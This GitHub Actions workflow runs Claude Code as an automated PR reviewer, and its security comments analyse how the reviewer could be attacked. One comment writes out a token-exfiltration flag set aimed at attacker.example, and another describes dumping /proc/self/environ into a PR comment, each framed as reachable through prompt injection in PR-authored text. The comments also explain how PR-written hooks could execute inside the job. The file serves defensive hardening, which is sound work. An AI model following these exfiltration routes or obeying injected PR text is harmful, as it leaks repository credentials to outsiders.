name: claude-code-review

# Automated PR review by Claude Code, posting inline comments on the specific
# lines where it finds issues. Runs on-demand, not on every push: a full review
# fires when a PR is opened or marked ready-for-review, and re-reviews fire when
# the author applies the `re-review` label (auto-cleared after, so it is a reusable
# "re-request review" button). Pushes do NOT auto-review, so a round of feedback
# commits does not trigger a fresh review each time. Controls (labels): `skip-review`
# (no review at all), `review:light` / `review:deep` (intensity). See the
# `creating-pull-requests` skill for the author-facing flow. This is the "auto"
# half of the Claude review setup; claude.yml is the interactive "@claude" half.
#
# Auth: uses CLAUDE_CODE_OAUTH_TOKEN (a long-lived token from `claude setup-token`)
# so reviews draw on the maintainer's Claude subscription rather than per-token API
# billing. Anthropic's own action counts as "ordinary individual use of Claude
# Code", which is the sanctioned use of a subscription token; see the PR that
# introduced this file for the full Terms-of-Service rationale.
#
# Public-repo safety: this runs only on same-repo (non-fork) PRs, enforced in two
# places — the job `if` below for `pull_request` events, and the "Resolve target PR"
# step for `workflow_dispatch`, which the `if` cannot gate because a hand-typed PR
# number is not in the event payload. GitHub does not expose repository secrets to
# workflows triggered by fork PRs, so the token would be empty there anyway; the
# `if` skips them cleanly instead of failing, and dispatch refuses them with a
# message. To review a contributor's fork PR, @claude it (handled by claude.yml) or
# run `/code-review <pr>` locally.
#
# KNOWN BLIND SPOT — a PR with merge conflicts gets NO review, and no red check
# either (DOR-457). GitHub builds the test-merge ref (`refs/pull/N/merge`) before
# it creates a `pull_request` workflow run; when the PR conflicts with its base
# that ref cannot be built, so GitHub creates **no run at all** — not a failed
# one, not a skipped one, nothing in the Actions run list. This hits every
# `pull_request` workflow in the repo at once (changelog-fragment-check went quiet
# on the same events), so it is not something this file's triggers, `if`, or
# `concurrency` can fix. It is why PR #446 looked reviewed-and-clean having never
# been reviewed: `opened`, two `labeled`, and `ready_for_review` all landed while
# it conflicted, and only its two rebase force-pushes produced runs. Rebase to
# restore CI — or, to review without rebasing, use the `workflow_dispatch` below.
#
# SECOND BLIND SPOT — a PR that edits this workflow gets a GREEN check and no
# review. That one lives in the action, not in GitHub; the `workflow_dispatch`
# comment below has the mechanism and the way around it. It is scoped to the
# running workflow file, so a PR editing claude.yml silences @claude on that PR
# the same way and leaves this review working, and vice versa.
#
# What is deliberately made loud rather than silent: an infra failure posts a
# comment naming its actual cause (see "Note infra failure"), and
# `workflow_dispatch` exists so a review can be forced by hand on a PR GitHub will
# not dispatch events for.
#
# The dispatch path is NOT the automatic path with a different trigger. The action
# treats workflow_dispatch as an *automation* context with no PR identity, which
# switches off two things it does for us on `pull_request`, so this file supplies
# both: the PR head's agent config is reverted by a step here ("Revert PR-authored
# agent config"), and line-level findings are posted through `gh api` because the
# inline-comment tool is not registered (see "Claude Code review"). Keep that in
# mind before assuming a dispatch run behaves identically.

on:
  # On-demand, not on every push: no `synchronize`. A full review fires on open
  # and on ready-for-review; re-reviews fire when the `re-review` label is added.
  pull_request:
    types: [opened, ready_for_review, reopened, labeled]

  # Manual review of any open PR by number. Two jobs (DOR-457):
  #   1. Escape hatch for the conflicted-PR blind spot above — the only way to get
  #      a review onto a PR GitHub refuses to dispatch events for.
  #   2. Debugging affordance for this file. A PR that edits this workflow gets a
  #      GREEN `claude-code-review` check and no review: the steps below do run
  #      (a `pull_request` run uses the PR merge commit's copy of the workflow,
  #      not the default branch's), but `anthropics/claude-code-action` refuses to
  #      start when the workflow file's content differs from the copy on the
  #      default branch — an anti-exfiltration guard, since a PR could otherwise
  #      rewrite this file to leak the OAuth token — and it exits SUCCESSFULLY:
  #      "Skipping action due to workflow validation ... must ... have identical
  #      content to the version on the repository's default branch". So a change
  #      here is unreviewable and untestable until it lands. After merging, come
  #      back and dispatch against a known PR number: run from the default branch
  #      the content matches, the guard passes, and the review actually runs.
  # Dispatch already requires write access, so it needs no author gate; it is an
  # explicit human action and therefore ignores `skip-review` and draft state. It
  # still refuses fork PRs (see "Resolve target PR").
  workflow_dispatch:
    inputs:
      pr:
        description: 'Number of the pull request to review (same-repo PRs only)'
        required: true
        type: string

# Opt into Node 24 for JavaScript-based actions ahead of GitHub's Sept 2026 cutoff
# for the Node 20 runtime (matches docs-openapi-check.yml).
env:
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: 'true'
  # The repo's own default branch: the one ref in this job that a PR cannot write
  # to, so the trust anchor for everything below that must not come from the PR's
  # checkout — the agent-config revert AND the failure classifier. Defined at
  # workflow level, not per step, because BOTH triggers need it: the
  # `github.event.repository` object is present on `pull_request` and
  # `workflow_dispatch` alike, and scoping it to the dispatch-only revert step is
  # how the classifier ended up running the PR's own copy on both paths (review
  # round 3, finding 1).
  DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
  # Turn budget for the review step (DOR-396). Large PRs need more read/grep/
  # verify turns than small ones, or the action dies mid-review and leaves a
  # red check that looks identical to one backed by real findings. Tune these
  # here rather than inside claude_args below.
  REVIEW_MAX_TURNS_DEFAULT: '50'
  REVIEW_MAX_TURNS_LARGE: '100'
  REVIEW_LARGE_PR_FILE_THRESHOLD: '30'

# A newer review trigger for the same PR cancels an in-flight older one — but
# only when this run will itself review. Without the condition, creating a PR
# with a `review:*` label fires `opened` + `labeled` together: the `labeled`
# run enters the group, cancels the legitimate `opened` review, then skips at
# the job gate below — silently leaving the PR unreviewed (bit PRs #142, #161).
# Verified still correct in DOR-457: PR #445 had `re-review` + `review:light`
# applied in the same second and the `review:light` run skipped without touching
# the `re-review` run beside it. Note also that a concurrency cancellation always
# leaves a `cancelled` run in the list, so this block can never be the reason a
# PR shows no run at all — that is the conflicted-PR blind spot in the header.
# `github.event.pull_request.number` is null on workflow_dispatch, so fall back to
# the input to keep manual runs in the same per-PR group. `github.event.action` is
# also null there, so `cancel-in-progress` evaluates TRUE for a manual run: a
# dispatch cancels an automatic review already in flight on the same PR, and the
# next automatic trigger cancels a dispatched one. That is the behaviour we want —
# the newer request is the one someone is waiting on — but it does mean a dispatch
# replaces a running review rather than joining it.
concurrency:
  group: claude-review-${{ github.event.pull_request.number || github.event.inputs.pr }}
  cancel-in-progress: ${{ github.event.action != 'labeled' || github.event.label.name == 're-review' }}

permissions:
  contents: read
  pull-requests: write
  issues: read
  id-token: write

jobs:
  review:
    # Same-repo PRs only (fork PRs have no secret access — see header), not while
    # still a draft, and not when the author opted out with `skip-review`. On a
    # `labeled` event, only the `re-review` label triggers a pass (adding a
    # `review:*` or `skip-review` label must not itself fire a review).
    # A workflow_dispatch run bypasses these gates on purpose — it is a maintainer
    # asking for a review by hand — but "Resolve target PR" still enforces the
    # same-repo rule, which is the one that is about safety rather than politeness.
    if: >-
      github.event_name == 'workflow_dispatch' ||
      (
        github.event.pull_request.head.repo.full_name == github.repository &&
        github.event.pull_request.draft == false &&
        !contains(github.event.pull_request.labels.*.name, 'skip-review') &&
        (github.event.action != 'labeled' || github.event.label.name == 're-review')
      )
    runs-on: ubuntu-latest
    # Guards against a runaway review if --max-turns is not honored (the action
    # has no internal timeout). Sized for the large-PR turn budget above
    # (REVIEW_MAX_TURNS_LARGE): raising max-turns without headroom here would
    # just trade the turn cap for a wall-clock cap on big PRs.
    timeout-minutes: 25
    steps:
      # Single answer to "which PR is this reviewing?", so every step below works
      # under either trigger. Runs before checkout because `gh` needs no worktree.
      # The dispatch input is hand-typed, so it is validated here: a non-numeric
      # value would otherwise flow into `gh pr view` and the prompt as nonsense.
      # Fork PRs are refused rather than reviewed: the job `if` cannot see a PR
      # number typed into a dispatch form, so the same-repo rule from the header is
      # re-asserted here. That rule is the trust boundary the rest of this job
      # assumes — see "Revert PR-authored agent config", which is what actually
      # hardens the head's config, and note that same-repo is a floor, not a
      # substitute for it.
      - name: Resolve target PR
        id: target
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EVENT_NAME: ${{ github.event_name }}
          EVENT_PR: ${{ github.event.pull_request.number }}
          DISPATCH_PR: ${{ github.event.inputs.pr }}
          REPO: ${{ github.repository }}
        run: |
          if [ "$EVENT_NAME" != 'workflow_dispatch' ]; then
            echo "number=$EVENT_PR" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          case "$DISPATCH_PR" in
            '' | *[!0-9]*)
              echo "::error::'pr' must be a pull request number; got '$DISPATCH_PR'"
              exit 1
              ;;
          esac

          head_repo=$(gh pr view "$DISPATCH_PR" --repo "$REPO" \
            --json headRepositoryOwner,headRepository \
            --jq '"\(.headRepositoryOwner.login)/\(.headRepository.name)"')
          if [ "$head_repo" != "$REPO" ]; then
            echo "::error::PR #$DISPATCH_PR comes from a fork ($head_repo). Review fork PRs by mentioning @claude on them (claude.yml) or with /code-review locally."
            exit 1
          fi

          echo "number=$DISPATCH_PR" >> "$GITHUB_OUTPUT"

      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          # Empty means "checkout's own default", which for a `pull_request` run is
          # the PR's test-merge ref — leave that path exactly as it was. A
          # workflow_dispatch run would otherwise check out the dispatched branch
          # (main) and review the PR against the wrong files, so point it at the
          # target PR's head instead.
          ref: ${{ github.event_name == 'workflow_dispatch' && format('refs/pull/{0}/head', steps.target.outputs.number) || '' }}

      # SECURITY (DOR-457). On `pull_request` the action neutralizes the PR head's
      # agent config for us. On `workflow_dispatch` it does not, so do it here.
      #
      # `anthropics/claude-code-action` calls restoreConfigFromBase() only when the
      # event produced a PR *entity* context (src/entrypoints/run.ts). A
      # workflow_dispatch run is an *automation* context with no `isPR` at all
      # (src/github/context.ts), so that restore never fires. It exists because the
      # CLI's non-interactive mode trusts the working directory: it reads
      # `.mcp.json`, `.claude/settings.json` and `.claude/settings.local.json` from
      # cwd and acts on them BEFORE any tool-permission gating — running hooks
      # (including SessionStart), setting env vars (NODE_OPTIONS, LD_PRELOAD, PATH),
      # shelling out for apiKeyHelper/awsAuthRefresh, and auto-approving project MCP
      # servers (the action sets enableAllProjectMcpServers itself).
      #
      # This repo supplies the trigger. Its own `.claude/settings.json` defines a
      # PreToolUse hook on `Bash` that runs `node .claude/hooks/file-guard.mjs`, and
      # both it and the hook scripts are tracked and PR-editable. The reviewer's
      # first act is `gh pr diff` — a Bash call — so a PR-authored hook would
      # execute as a shell command inside a job holding CLAUDE_CODE_OAUTH_TOKEN and
      # an OIDC-minted App token with write scopes.
      #
      # The trust boundary, stated plainly: reaching this needs push access,
      # because only a same-repo PR gets past "Resolve target PR". This is not a
      # fork-PR RCE. But upstream deliberately closed it even for same-repo PRs,
      # and an escape hatch must not be softer than the path it substitutes for.
      #
      # Dispatch-only on purpose: running it on `pull_request` too would pre-empt
      # the action's own restore and make its `.claude-pr/` snapshot (kept so
      # review agents can inspect what a PR changes) capture the base version
      # instead of the PR's.
      #
      # The path list is the action's own SENSITIVE_PATHS
      # (src/github/operations/restore-config.ts): everything PR-controllable that
      # the CLI reads from cwd at startup. Restore from the repo's DEFAULT branch
      # rather than the PR's base, because a stacked PR's base is another PR's head
      # and so is not itself vouched for. Delete before checking out, because
      # `git checkout <ref> -- <path>` cannot remove a file the PR ADDED.
      - name: Revert PR-authored agent config
        if: github.event_name == 'workflow_dispatch'
        run: |
          # Fail closed: without a trusted branch to restore from there is nothing
          # to revert to, and reviewing anyway would run the PR's own hooks.
          if [ -z "$DEFAULT_BRANCH" ]; then
            echo "::error::Could not resolve the default branch; refusing to review with PR-authored agent config in place."
            exit 1
          fi

          paths=(.claude .mcp.json .claude.json .gitmodules .ripgreprc CLAUDE.md CLAUDE.local.md .husky)

          # Delete every PR-controlled path BEFORE any git operation that touches
          # the network, mirroring the order upstream uses (restore-config.ts): a
          # hostile `.gitmodules` is then simply absent while git is talking to a
          # remote, rather than being suppressed by a flag. `--no-recurse-submodules`
          # below stays as the second layer, which is how upstream treats it.
          present=
          for p in "${paths[@]}"; do
            [ -e "$p" ] && present="$present $p "
            rm -rf "$p"
          done
          was_present() { case "$present" in *" $1 "*) return 0 ;; *) return 1 ;; esac; }

          # `fetch-depth: 0` on the checkout above already fetched
          # `+refs/heads/*:refs/remotes/origin/*`, so the default branch is normally
          # here already — fetch only if it is missing. Never with `--depth=1`:
          # fetching a branch shallow makes the WHOLE checkout shallow, which cut
          # `git rev-list --count` from 1765 to 1 and truncated `git log <path>` to a
          # single entry. The reviewer holds `Bash(git log:*)` and REVIEW.md tells it
          # to trace history, so shallowing the tree quietly degrades the review.
          if ! git rev-parse --verify --quiet "refs/remotes/origin/$DEFAULT_BRANCH" >/dev/null; then
            if ! git fetch --no-recurse-submodules --no-tags origin \
              "+refs/heads/$DEFAULT_BRANCH:refs/remotes/origin/$DEFAULT_BRANCH"; then
              echo "::error::Could not fetch origin/$DEFAULT_BRANCH; refusing to review with PR-authored agent config in place."
              exit 1
            fi
          fi

          restored=
          deleted=
          for p in "${paths[@]}"; do
            if git checkout "origin/$DEFAULT_BRANCH" -- "$p" 2>/dev/null; then
              restored="$restored $p"
            elif was_present "$p"; then
              # Absent on the default branch: the PR added it. It stays deleted.
              deleted="$deleted $p"
            fi
          done

          # `git checkout <ref> -- <path>` stages what it restores; unstage so the
          # revert cannot leak into anything committed later.
          git reset -- "${paths[@]}" >/dev/null 2>&1 || true

          # Logged (not just done) so a dispatch run is auditable and the
          # post-merge validation in this PR's description can assert on it.
          echo "Reverted from origin/$DEFAULT_BRANCH:${restored:- (nothing present)}"
          if [ -n "$deleted" ]; then
            echo "Deleted (PR-added, absent on origin/$DEFAULT_BRANCH):$deleted"
          fi

      # Timestamp cutoff for the infra-failure step below, so it only looks at
      # comments this run could plausibly have posted (not leftovers from an
      # earlier review or re-review pass on the same PR).
      - name: Record review start time
        id: review-start
        run: echo "time=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"

      # Scale the turn budget with PR size (DOR-396): a 5-file PR and a 45-file
      # PR need very different amounts of read/grep/verify work to finish a
      # review, and one fixed cap starves the large ones.
      - name: Count changed files
        id: pr-size
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # Degrade to the default budget rather than aborting the step: an
          # aborted step here would skip Claude Code review entirely (outcome
          # 'skipped', not 'failure'), so the infra-note step below wouldn't
          # fire either — a silent red check with no review at all, exactly
          # the DOR-396 symptom this workflow exists to prevent.
          file_count=$(gh pr view "${{ steps.target.outputs.number }}" --repo "${{ github.repository }}" --json changedFiles --jq '.changedFiles' 2>/dev/null || echo 0)
          case "$file_count" in ''|*[!0-9]*) file_count=0 ;; esac
          if [ "$file_count" -gt "$REVIEW_LARGE_PR_FILE_THRESHOLD" ]; then
            echo "max_turns=$REVIEW_MAX_TURNS_LARGE" >> "$GITHUB_OUTPUT"
          else
            echo "max_turns=$REVIEW_MAX_TURNS_DEFAULT" >> "$GITHUB_OUTPUT"
          fi
          echo "$file_count files changed"

      - name: Claude Code review
        id: claude-review
        uses: anthropics/claude-code-action@v1
        with:
          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          # Plain-prompt review following Anthropic's "Automatic PR Code Review"
          # recipe. The earlier code-review plugin variant ran but posted nothing:
          # it was never granted the comment-posting tools, so it hit a permission
          # denial and produced no review. The prompt below names the posting tools
          # explicitly and `claude_args` allow-lists them.
          prompt: |
            REPO: ${{ github.repository }}
            PR NUMBER: ${{ steps.target.outputs.number }}
            INLINE COMMENTS: ${{ github.event_name == 'workflow_dispatch' && 'gh api' || 'inline-comment tool' }}

            You are reviewing this pull request as a senior DorkOS engineer.

            First, read REVIEW.md and AGENTS.md at the repository root and apply
            them in full, including REVIEW.md's "How to review" process, the
            deletion dangling-reference sweep, the conventions checks, and the
            path-specific focus. Treat DorkOS Hard Rule violations (FSD layers, SDK
            import confinement, the os.homedir ban, marketplace rollback safety) as
            Important severity. Respect the nit cap, skip lists, and verification
            bar.

            Set the review scope before you start, from the PR labels
            (`gh pr view --json labels`):
            - `review:light` present: quick pass only. Post only 🔴 Important
              findings; skip nits and the deletion sweep.
            - `review:deep` present: be exhaustive. Trace every caller and run the
              full dangling-reference sweep.
            - otherwise: the standard review.
            Then check whether you have already reviewed this PR (look for your own
            prior summary comment via `gh pr view --json comments`). If you have,
            this is a RE-REVIEW: read your prior findings, treat addressed or
            resolved ones as done, review only what changed since your last pass,
            and post only NEW or still-unaddressed 🔴 Important findings. Do not
            repeat resolved findings and do not raise fresh nits on a re-review.

            The code under review is already checked out: on an automatic run that
            is the PR's test-merge ref (the PR merged into its base), and on a manual
            dispatch it is the PR's head. Use `gh pr diff <PR NUMBER>` for the
            changes — always pass the number, because the checkout is a detached
            HEAD and an argument-less `gh pr diff` cannot infer the PR — and read the
            surrounding files for context. One exception: `.claude/`, `.mcp.json`,
            `CLAUDE.md` and `.husky` on disk are reverted to a trusted branch's
            versions, not this PR's, because a PR must not be able to make its own
            reviewer execute hooks the PR wrote. Judge changes to those paths from
            the diff, never from disk. Work outward from the diff: for every
            symbol the PR changes, removes, or renames, grep the repo for its callers
            and references before judging the change safe. For any PR that DELETES or
            RENAMES files, paths, exports, commands, hooks, or config keys, run the
            dangling-reference sweep (grep the whole tree for every removed
            identifier, in prose and config too) before concluding it is clean.

            Verify each finding against the actual file (grep or Read) before
            posting; drop anything you cannot cite with a `file:line`. A false
            Important costs the author a round trip.

            Post each finding on the line it applies to. INLINE COMMENTS at the top
            of this prompt says how, because the two triggers differ:

            - `inline-comment tool`: use
              `mcp__github_inline_comment__create_inline_comment` (with
              `confirmed: true`).
            - `gh api`: that tool is NOT available on this run (the action registers
              it only for PR events, not manual dispatch). Do not try it. Read the
              head SHA once with
              `gh pr view <PR NUMBER> --json headRefOid --jq .headRefOid`, then post
              each finding with exactly this command shape — the leading words must
              match character for character or the call is refused:
              `gh api --method POST repos/<REPO>/pulls/<PR NUMBER>/comments -f body='<finding>' -f commit_id=<sha> -f path=<file> -F line=<n> -f side=RIGHT`
              If two such calls in a row are refused or error, stop retrying and
              fold every remaining finding into the summary comment instead, each
              one prefixed with `file:line`, so nothing is silently dropped.

            Then post a one-line severity tally (e.g. "1 important, 3 nits") as a
            top-level summary with `gh pr comment`.
            Only post GitHub comments; do not submit the review as a chat message.
            If there are no blocking issues, post a brief "No blocking issues
            found" summary comment.
          # --setting-sources user (DOR-457, security): without it the SDK defaults
          # to ["user","project","local"] (base-action/src/parse-sdk-options.ts), so
          # the CLI loads the checkout's own `.claude/settings.json`,
          # `.claude/settings.local.json` AND `.mcp.json`, and acts on them — hooks,
          # env vars, apiKeyHelper, project MCP servers — before any tool gating.
          # Measured on CC 2.1.219 with a project `.mcp.json` and a project
          # SessionStart hook, each spawning a marker process: no flag → both fired;
          # `user,project,local` → both fired; `user` → neither did. It fires even
          # with an invalid key, so a bad token is not protection.
          #
          # So this flag covers `.mcp.json` too, and it OVERLAPS the revert step
          # above rather than dividing the work with it. The revert step is still
          # doing something this flag does not: it is the only thing that covers what
          # is not a settings source and so is untouched here — `CLAUDE.md`,
          # `.claude/` context files (skills, agents, commands), `.claude.json`,
          # `.gitmodules`, `.ripgreprc`. Two independent controls over `.mcp.json` is
          # the intent, not an accident.
          #
          # `user` is the scope the action writes its own settings into, so nothing
          # the action needs is lost — but that is narrower than it reads. It also
          # drops this repo's own deny list from `.claude/settings.json`
          # (`Read(./.env)`, `Read(./**/*.pem)`, `Read(./Secrets/**)`, ...). On a
          # throwaway runner with none of those files present that costs nothing, and
          # the reviewer's permissions come from --allowedTools instead — but it is a
          # real narrowing of protection, not a free one.
          #
          # The second --allowedTools line (dispatch only) is finding 3 of the
          # DOR-457 review: the action registers the github_inline_comment MCP
          # server only for PR entity events (src/mcp/install-mcp-server.ts), the
          # same gate as the config restore, so on dispatch that tool does not
          # exist. Without a fallback the hatch silently degrades to summary-only
          # and drops every line-level finding — while still posting a summary, so
          # the loss is invisible.
          #
          # Be precise about what that grant buys, because an earlier version of this
          # comment claimed it was "exactly the authority the MCP server would have
          # had" and that is false. Claude Code's Bash matcher is a PREFIX match. It
          # does refuse chaining (`&&`, `;`, newline), command substitution, pipes and
          # redirection, and it refuses extending the endpoint path — all probed. But
          # it ALLOWS extra flags on the same invocation, and `$VAR` expansion, so
          # `--hostname attacker.example -H "Authorization: Bearer $GH_TOKEN"` reaches
          # an arbitrary host with the token attached. The MCP server could not do
          # that. Firing it needs prompt injection out of PR-authored text.
          #
          # It is left in place because the identical exfil is already reachable from
          # the always-on `Bash(grep:*)` + `Bash(gh pr comment:*)` pair (read
          # /proc/self/environ, post it) on BOTH triggers, which predates this file's
          # dispatch path — so tightening only this line would buy nothing while
          # costing the inline comments the dispatch path exists to keep. Closing the
          # class properly means taking the token out of the CLI's reach behind a
          # fixed-shape posting helper, which is its own change, not a comment fix.
          #
          # It is still deliberately NOT `Bash(gh api:*)`: the token the CLI sees is
          # the action's OIDC-minted App token with contents/issues/pull_requests
          # WRITE (src/github/token.ts), so a broad `gh api` grant would also let a
          # reviewer reading PR-authored text push commits — a different and worse
          # authority than leaking a token that already leaks.
          claude_args: |
            --allowedTools "mcp__github_inline_comment__create_inline_comment,Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*),Bash(git grep:*),Bash(git log:*),Bash(git show:*),Bash(grep:*),Bash(rg:*),Bash(ls:*),Read,Grep,Glob"
            ${{ github.event_name == 'workflow_dispatch' && format('--allowedTools "Bash(gh api --method POST repos/{0}/pulls/{1}/comments:*)"', github.repository, steps.target.outputs.number) || '' }}
            --setting-sources user
            --max-turns ${{ steps.pr-size.outputs.max_turns }}

      # Self-explaining infra failures (DOR-396): a review that dies produces a red
      # check indistinguishable from a red check backed by real findings, forcing a
      # human to read Actions logs to tell them apart. Post a plain comment naming
      # the cause — but the cause has to be *read*, not assumed. This step used to
      # assert one cause for every failure (DOR-457): nine runs across three PRs
      # died at turn 1 having spent nothing, and each was announced as "ran out of
      # its turn budget", which sent the maintainer looking at --max-turns instead
      # of at credentials and quota.
      #
      # The classification lives in scripts/classify-review-failure.sh, pinned by
      # scripts/test-review-classifier.sh against fixtures taken from real runs.
      # Do not re-inline it. The first DOR-457 fix still got this wrong because it
      # split on turns and spend and never read `subtype` — the field that says why
      # the run ended — so a usage limit crossed at turn 20 would still have been
      # announced as an exhausted turn budget. The fixtures exist so that exact
      # shape (subtype "success" with is_error:true after real work, the action's
      # own separate failure class) stays a caught regression.
      #
      # SECURITY (review round 3, finding 1): run that script from the DEFAULT
      # BRANCH, never from the checkout. `scripts/` is not in the action's
      # SENSITIVE_PATHS and not in the revert step above, and on BOTH triggers the
      # checkout is PR-authored (the merge ref on `pull_request`,
      # `refs/pull/N/head` on dispatch) — so `bash scripts/...` would execute a
      # shell script a PR wrote, inside a job that holds CLAUDE_CODE_OAUTH_TOKEN
      # and, via `id-token: write`, can mint the action's App token with
      # contents/pull_requests/issues WRITE. The server-side guard that stops a PR
      # rewriting THIS file does not help: it validates the workflow file, so a PR
      # touching only `scripts/` sails past it. Extracting the jq for testability
      # is what moved it into untrusted space; `git show` puts it back.
      #
      # This is the general rule for this job, not a one-off: nothing executed here
      # may come from the checkout. Everything else already complies — the other
      # steps run only `gh`, `git`, `date` and shell builtins from the runner image,
      # and both `uses:` are remote actions resolved by GitHub, not files on disk.
      #
      # The action hides its transcript (`show_full_output` defaults false, and this
      # repo is public so it should stay that way), which is why nobody could tell
      # these apart from the logs. The result message's own error string is
      # surfaced instead — flattened to one line, with backticks and token-shaped
      # strings stripped, inside a fenced block so it cannot break out of the
      # comment or ping anyone.
      - name: Note infra failure if the review did not complete
        if: failure() && steps.claude-review.outcome == 'failure'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EXECUTION_FILE: ${{ steps.claude-review.outputs.execution_file }}
          PR_NUMBER: ${{ steps.target.outputs.number }}
          REPO: ${{ github.repository }}
          SINCE: ${{ steps.review-start.outputs.time }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          # Prefer the action's own output; fall back to the path it logs, since a
          # composite action's outputs are not guaranteed to survive its failure.
          exec_file="$EXECUTION_FILE"
          if [ -z "$exec_file" ] || [ ! -f "$exec_file" ]; then
            exec_file="$RUNNER_TEMP/claude-execution-output.json"
          fi

          # Materialize the classifier from the trusted branch (see the SECURITY
          # note above) and run THAT copy. `git show <ref>:<path>` reads the object
          # database, so a PR cannot influence it whatever it does to the worktree —
          # including deleting the script, which just makes the trusted copy the
          # only one there is.
          #
          # If it cannot be materialized, degrade to `unknown` instead of exiting:
          # refusing to run PR-authored code is the fail-closed part, but aborting
          # here would also skip the comment below, which turns a wrongly-worded red
          # check into a silent one — the DOR-396 symptom this whole step exists to
          # prevent. The `unknown` wording points at the Actions log and invents no
          # cause, which is exactly right when the classifier could not be reached.
          classifier="$RUNNER_TEMP/classify-review-failure.sh"
          why=unknown
          reported=
          if [ -z "$DEFAULT_BRANCH" ]; then
            echo "::warning::Could not resolve the default branch; skipping failure classification rather than running the PR's copy of the classifier."
          elif ! git show "origin/$DEFAULT_BRANCH:scripts/classify-review-failure.sh" >"$classifier" 2>/dev/null; then
            echo "::warning::Could not read scripts/classify-review-failure.sh from origin/$DEFAULT_BRANCH; skipping failure classification rather than running the PR's copy."
          else
            why=$(bash "$classifier" class "$exec_file") || why=unknown
            reported=$(bash "$classifier" reported "$exec_file") || reported=
          fi
          echo "review failure class: $why (from $exec_file)"

          # Was a verdict already posted? Scoped to comments this run could have
          # made, so an earlier pass's summary is not mistaken for this one's.
          #
          # No pipe anywhere in here, on purpose. `grep -q` exits at its first match
          # and closes the pipe; whatever is on the left then dies of SIGPIPE (141),
          # and the runner's `-o pipefail` makes that the status of the whole
          # pipeline — turning a verdict that WAS posted into "not found", which
          # then tells the author their review was lost when it is sitting right
          # above the comment. Capturing `gh` into a variable first (the round-2 fix)
          # only moved the pipe; it still failed the same way once the comments
          # exceeded the 64 KB pipe buffer with a match early in them. Measured with
          # the matching line first: 4 KB → 0, 1.5 MB → 141. A here-string writes to
          # a temp file with no upstream process to kill: 1.5 MB → 0.
          verdict_posted() {
            local bodies
            bodies=$(gh api --paginate "repos/$REPO/issues/$PR_NUMBER/comments" \
              --jq ".[] | select(.created_at > \"$SINCE\") | .body" 2>/dev/null) || return 1
            grep -qE '[0-9]+ important|[0-9]+ nits?|No blocking issues|No factual issues' \
              <<<"$bodies"
          }

          case "$why" in
            no)
              body="This check is red because the review never started — Claude got no answer from the model, so nothing in this PR was looked at. That is a problem with the reviewer, not with this PR: usually the Claude subscription behind \`CLAUDE_CODE_OAUTH_TOKEN\` has hit its usage limit (it clears on its own), or that token needs regenerating. Add the \`re-review\` label to try again."
              ;;
            max_turns)
              if verdict_posted; then
                body="This check is red because the review ran out of its turn budget wrapping up, not because it found more issues. The verdict already posted above stands. Add the \`re-review\` label for a fresh pass."
              else
                body="This check is red because the review ran out of its turn budget before it could post a verdict, not because it found blocking issues. Add the \`re-review\` label to try again."
              fi
              ;;
            died)
              # Deliberately does not say WHERE it died. This class now covers an
              # error the run named for itself, which can happen at turn 1 (an MCP
              # server that failed to start) or at turn 40 (a usage limit crossed
              # mid-review) — so naming a point in the run would be the same kind of
              # guess this step exists to stop making. The Reported line below
              # carries the run's own words.
              if verdict_posted; then
                body="This check is red because the review hit an error and stopped. It did not run out of turns, and it is not saying anything more about this PR. The verdict already posted above stands. Add the \`re-review\` label for a fresh pass."
              else
                body="This check is red because the review hit an error and stopped before it could post a verdict. It did not run out of turns, and this is not a finding about your code. Add the \`re-review\` label to try again."
              fi
              ;;
            completed)
              body="This check is red even though the review itself finished and reported success, so whatever failed is in the machinery around the review, not the review. Any verdict above is the complete one. The step that failed is in the [Actions log]($RUN_URL)."
              ;;
            *)
              body="This check is red because the review did not finish, not because it found blocking issues — and it left no readable record of why, so the reason is only in the [Actions log]($RUN_URL). Add the \`re-review\` label to try again."
              ;;
          esac

          if [ -n "$reported" ]; then
            echo "::error::Claude reported: $reported"
            body="$body"$'\n\nReported:\n\n```\n'"$reported"$'\n```'
          fi

          gh pr comment "$PR_NUMBER" --repo "$REPO" --body "$body"

      # Re-review is a reusable button: clear the label so re-applying it later
      # fires another pass. Runs even if the review failed, so the label never
      # sticks. `re-review` is the only label that triggers this workflow.
      #
      # Dispatch clears it too (DOR-457). It used to be scoped to `labeled` events,
      # which stranded the label in exactly the case the dispatch hatch exists for:
      # labelling a conflicted PR produces no run at all, so nothing clears the
      # label, so the button is stuck down until someone removes it by hand. A
      # dispatched review is the same "look at this again" request, so it is the
      # right moment to reset the button.
      - name: Clear re-review label
        if: >-
          always() && (
            github.event_name == 'workflow_dispatch' ||
            (github.event.action == 'labeled' && github.event.label.name == 're-review')
          )
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR_NUMBER: ${{ steps.target.outputs.number }}
          REPO: ${{ github.repository }}
        run: |
          # On dispatch the label is usually absent, and `gh pr edit --remove-label`
          # errors on a label the PR does not carry — so look first. An empty
          # PR_NUMBER (the resolve step refused a fork) also lands here harmlessly.
          if gh pr view "$PR_NUMBER" --repo "$REPO" --json labels --jq '.labels[].name' 2>/dev/null \
            | grep -qx 're-review'; then
            gh pr edit "$PR_NUMBER" --repo "$REPO" --remove-label re-review
          else
            echo "no re-review label to clear"
          fi
